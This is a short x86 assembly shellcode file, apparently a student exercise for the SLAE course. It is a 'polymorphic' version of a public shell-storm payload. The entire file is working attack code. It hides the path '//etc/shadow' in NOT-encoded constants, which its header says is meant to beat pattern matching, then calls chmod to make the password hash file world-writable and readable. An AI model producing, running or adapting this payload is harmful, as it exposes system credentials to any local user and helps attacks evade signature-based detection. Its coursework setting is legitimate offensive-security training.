; SLAE - Assignment #6: Polymorphic shell code of http://shell-storm.org/shellcode/files/shellcode-590.php 
; Author:  Dipsy 
; Student ID: SLAE-1535
; Purpose: The purpose of this shellcode is to beat pattern matching 

global _start

section .text
_start:     

	sub eax,eax
	push eax

	mov eax, 0x88909b9e
	not eax 
	push eax 
	
	mov eax, 0x978cd0d0
	not eax 
	push eax 
	
	mov eax, 0x9c8b9ad0
	not eax 
	push eax 
 
	mov ebx,esp     ; moving pathname to EBX, //etc/shadow
	push word 0xD2A ; permissions 0777 
	pop ecx
	sub cx, 0xB2B
	
	sub eax, eax

	or al,0xf   ;chmod syscall 
	int 0x80

	or al,0x1   ;exit syscall 
	int 0x80
